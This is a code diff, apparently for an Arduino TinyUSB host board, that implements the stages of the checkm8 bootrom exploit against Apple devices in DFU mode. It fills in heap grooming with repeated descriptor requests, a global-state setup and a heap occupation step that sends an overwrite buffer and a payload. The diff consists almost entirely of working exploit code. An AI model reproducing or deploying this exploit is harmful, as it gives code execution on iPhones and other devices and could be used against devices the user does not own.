@@ -14,6 +14,7 @@ enum Checkm8State {
 static Checkm8State checkm8_state = CHECKM8_INIT_RESET;
 static bool is_dfu = false;
 static tusb_desc_device_t dev_desc;
+static uint8_t serial_idx = 0;
 
 void send_setup(uint8_t bmRequestType, uint8_t bRequest,
                 uint16_t wValue, uint16_t wIndex, uint16_t wLength) {
@@ -33,22 +34,87 @@ void send_data(const uint8_t *data, uint16_t len) {
 
 void heap_feng_shui() {
   Serial.println("1. heap feng-shui");
-  // TODO: implement TinyUSB host transfers
+  uint8_t buf[0x40];
+
+  // initial setup stage as in original exploit
+  send_setup(0x00, 2, 0x0003, 0, 0);
+  TinyUSBHost.task();
+
+  for (int i = 0; i < 620; i++) {
+    send_setup(0x80, 6, (0x03 << 8) | serial_idx, 0x040a, 0x80);
+    send_data(buf, 0x80);
+    TinyUSBHost.task();
+  }
+
+  send_setup(0x80, 6, (0x03 << 8) | serial_idx, 0x040a, 0x81);
+  send_data(buf, 0x81);
+  TinyUSBHost.task();
 }
 
 void set_global_state() {
   Serial.println("2. set global state");
-  // TODO: implement TinyUSB host transfers
+  uint8_t tmpbuf[0x40];
+  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
+
+  send_setup(0x21, 1, 0, 0, 0x40);
+  send_data(tmpbuf, 0x40);
+  send_data(tmpbuf, 0x40);
+  TinyUSBHost.task();
+
+  send_setup(0x21, 1, 0, 0, 0);
+  TinyUSBHost.task();
+
+  send_setup(0xA1, 3, 0, 0, 6);
+  send_data(tmpbuf, 6);
+  TinyUSBHost.task();
+
+  send_setup(0xA1, 3, 0, 0, 6);
+  send_data(tmpbuf, 6);
+  TinyUSBHost.task();
+
+  send_setup(0x21, 1, 0, 0, padding + 0x40);
+  for (int i = 0; i < ((padding + 0x40) / 0x40); i++) {
+    memset(tmpbuf, 0, 0x40);
+    send_data(tmpbuf, 0x40);
+    TinyUSBHost.task();
+  }
 }
 
 void heap_occupation() {
   Serial.println("3. heap occupation");
-  // TODO: implement TinyUSB host transfers
+  uint8_t tmpbuf[0x40];
+
+  send_setup(0x80, 6, (0x03 << 8) | serial_idx, 0x040a, 0x81);
+  send_data(tmpbuf, 0x81);
+  TinyUSBHost.task();
+
+  Serial.println("overwrite sending ...");
+  send_setup(0x00, 0, 0, 0, 0x40);
+  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
+  send_data(tmpbuf, 0x40);
+  for (int i = 0; i < 0x40; i++) {
+    tmpbuf[i] = pgm_read_byte(overwrite + i);
+  }
+  send_data(tmpbuf, 0x40);
+  TinyUSBHost.task();
+
+  Serial.println("payload sending ...");
+  send_setup(0x21, 1, 0, 0, sizeof(payload));
+  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
+  send_data(tmpbuf, 0x40);
+  for (size_t i = 0; i < sizeof(payload); i += 0x40) {
+    for (int j = 0; j < 0x40; j++) {
+      tmpbuf[j] = pgm_read_byte(payload + i + j);
+    }
+    send_data(tmpbuf, 0x40);
+    TinyUSBHost.task();
+  }
 }
 
 void handle_device_mounted(uint8_t dev_addr) {
   // Query device descriptor once mounted
   tuh_descriptor_get_device_sync(dev_addr, &dev_desc);
+  serial_idx = dev_desc.iSerialNumber;
   if (dev_desc.idVendor == 0x05ac && dev_desc.idProduct == 0x1227) {
     is_dfu = true;
     checkm8_state = CHECKM8_INIT_RESET;
